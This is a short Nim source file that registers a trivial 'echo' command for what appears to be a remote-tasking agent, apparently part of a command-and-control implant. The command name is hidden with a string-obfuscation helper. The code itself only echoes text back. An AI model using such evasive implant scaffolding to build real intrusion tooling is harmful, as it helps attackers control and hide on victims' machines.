import std/json
import core/types
import commands/registry
import crypto/strenc

proc echoExecute(taskId: string, params: JsonNode, state: AgentState,
                 send: SendMsg): TaskResult =
  let text = params{"text"}.getStr("")
  return TaskResult(output: text, status: "success", completed: true)

proc initEcho*() =
  register(hidstr("echo"), echoExecute)
